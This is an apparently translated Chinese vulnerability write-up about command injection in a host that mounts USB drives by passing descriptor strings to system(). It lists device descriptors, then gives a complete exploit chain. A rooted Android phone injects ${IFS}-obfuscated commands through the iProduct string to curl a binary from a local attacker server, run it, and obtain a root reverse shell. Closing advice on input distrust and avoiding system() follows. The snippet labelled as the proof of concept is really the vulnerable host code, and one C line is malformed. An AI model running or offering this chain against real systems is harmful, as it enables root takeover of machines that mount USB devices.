### 设备配置与识别

#### USB设备描述符
- **bmAttributes**: 0x80 (总线供电)
- **MaxPower**: 500mA
- **接口描述符**:
  - **bLength**: 9
  - **bDescriptorType**: 4
  - **bInterfaceNumber**: 0
  - **bAlternateSetting**: 0
  - **bNumEndpoints**: 2
  - **bInterfaceClass**: 8 (大容量存储)
  - **bInterfaceSubClass**: 6 (SCSI)
  - **bInterfaceProtocol**: 80 (仅限批量传输)
  - **iInterface**: 5 (大容量存储)

##### 端点描述符
- **EP 1 IN**:
  - **bLength**: 7
  - **bDescriptorType**: 5
  - **bEndpointAddress**: 0x81
  - **bmAttributes**: 2 (传输类型: 批量, 同步类型: 无, 使用类型: 数据)
  - **wMaxPacketSize**: 0x0200 (512字节)
  - **bInterval**: 0

- **EP 1 OUT**:
  - **bLength**: 7
  - **bDescriptorType**: 5
  - **bEndpointAddress**: 0x01
  - **bmAttributes**: 2 (传输类型: 批量, 同步类型: 无, 使用类型: 数据)
  - **wMaxPacketSize**: 0x0200 (512字节)
  - **bInterval**: 1

#### 设备限定符 (用于其他设备速度)
- **bLength**: 10
- **bDescriptorType**: 6
- **bcdUSB**: 2.00
- **bDeviceClass**: 0 (在接口级别定义)
- **bDeviceSubClass**: 0
- **bDeviceProtocol**: 0
- **bMaxPacketSize0**: 64
- **bNumConfigurations**: 1

#### 设备状态
- **Device Status**: 0x0000 (总线供电)

### 查看和挂载设备
通过以下命令查看设备：
```sh
$ ls -lh /dev/disk/by-id
lrwxrwxrwx 1 root root  9 Aug  2 14:35 usb-Linux_File-CD_Gadget_0000000000000000-0:0 -> ../../sdb
lrwxrwxrwx 1 root root 10 Aug  2 14:35 usb-Linux_File-CD_Gadget_0000000000000000-0:0-part1 -> ../../sdb1
```

挂载设备：
```sh
$ mkdir HAX && sudo mount /dev/sdb1 HAX
```

### 修改设备参数
```sh
# echo 0 > /sys/class/android_usb/android0/enable
# echo 1337 > /sys/class/android_usb/android0/idProduct
# echo 'Carve Systems' > /sys/class/android_usb/android0/iManufacturer
# echo '1337 Hacking Team' > /sys/class/android_usb/android0/iProduct
# echo 1 > /sys/class/android_usb/android0/enable
```

验证修改后的设备信息：
```sh
$ lsusb -v -d 18d1:
Bus 003 Device 044: ID 18d1:1337 Google Inc.
Device Descriptor:
  ...
  idProduct: 0x1337
  ...
  iManufacturer: 1 Carve Systems
  iProduct: 2 1337 Hacking USB
  ...
```

### 利用示例
为了帮助读者理解该漏洞的严重性，下面提供一个POC示例代码：

```c
snprintf(dir, DIR_SIZE, "/mnt/storage/%s%s%s", LABEL, iManufacturer, iProduct);
snprintf(cmd, CMD_SIZE, "mount %s %s", /dev/DEVICE, dir);
system(cmd);
```

上述代码将执行以下操作：
1. 下载一个shell脚本，生成反向shell。
2. 用`sh`执行该文件。

需要注意的是，系统会从这些变量中删除空格和`/`，但`system`函数会将其传递给一个理解`$IFS`和子shell的shell。

对于Android设备，可以按如下方式构建命令链：

```sh
# echo 0 > /sys/class/android_usb/android0/enable
# echo ';{cmd};' > /sys/class/android_usb/android0/iProduct
# echo 1 > /sys/class/android_usb/android0/enable
```

完整的命令链如下（省略了一些必要的`sleep`命令）：

```sh
# echo 0 > /sys/class/android_usb/android0/enable
# echo ';echo${IFS}b=`printf$IFS'"'"'\\x2f'"'"'`>>a;' > /sys/class/android_usb/android0/iProduct
# echo 1 > /sys/class/android_usb/android0/enable
# echo 0 > /sys/class/android_usb/android0/enable
# echo ';echo${IFS}s=\"$IFS\">>a;' > /sys/class/android_usb/android0/iProduct
# echo 1 > /sys/class/android_usb/android0/enable
# echo 0 > /sys/class/android_usb/android0/enable
# echo ';echo${IFS}u=http:\$b\${b}192.168.1.152:8000\${b}shell>>a;' > /sys/class/android_usb/android0/iProduct
# echo 1 > /sys/class/android_usb/android0/enable
# echo 0 > /sys/class/android_usb/android0/enable
# echo ';echo${IFS}curl\$s-s\$s-o\${s}shell\$s\$u>>a;' > /sys/class/android_usb/android0/iProduct
# echo 1 > /sys/class/android_usb/android0/enable
# echo 0 > /sys/class/android_usb/android0/enable
# echo ';echo${IFS}chmod\$s+x\${s}shell>>a;' > /sys/class/android_usb/android0/iProduct
# echo 1 > /sys/class/android_usb/android0/enable
# echo 0 > /sys/class/android_usb/android0/enable
# echo ';echo${IFS}\${b}shell>>a;' > /sys/class/android_usb/android0/iProduct
# echo 1 > /sys/class/android_usb/android0/enable
# echo 0 > /sys/class/android_usb/android0/enable
# echo ';sh${IFS}a;' > /sys/class/android_usb/android0/iProduct
# echo 1 > /sys/class/android_usb/android0/enable
```

这些命令可以放到一个文件(`/a`)中：
```sh
b=/
s=" "
u=http:$b${b}192.168.1.152:8000${b}shell
curl$s-s$s-o${s}shell$s$u
chmod$s+x${s}shell
${b}shell
```

最后一个命令是用`sh a`执行这个文件。这个脚本将会拉取一个二进制文件来获取反向shell。此后，您可以向反向shell发送自己喜欢的payload。执行完最后一个命令后，您将会看到：
```sh
$ nc -l -p 3567
id
uid=0(root) gid=0(root) groups=0(root)
```

### 安全建议
虽然使用Raspberry Pi Zero可能会更容易一些，但通过已经取得root权限的Android设备也可以轻松实现本文的目的。对于该漏洞，我们的安全建议是：

- 不要信任任何外部输入，即使是来自物理设备的输入。
- 对于黑名单方法，有时也存在容易绕过的漏洞。
- 避免这个问题的方法有很多，但最重要的是不要信任从外部设备中读取的属性。
- 如果需要唯一名称，请生成相应的UUID。
- 如果需要一个独一无二且不变的名称，请验证所需的参数是否存在，然后使用SHA256或您喜欢的哈希算法计算它们的哈希值。
- `system`函数应谨慎使用：直接使用C代码安装驱动器也不是什么难事。

通过这些措施，可以有效减少此类漏洞带来的风险。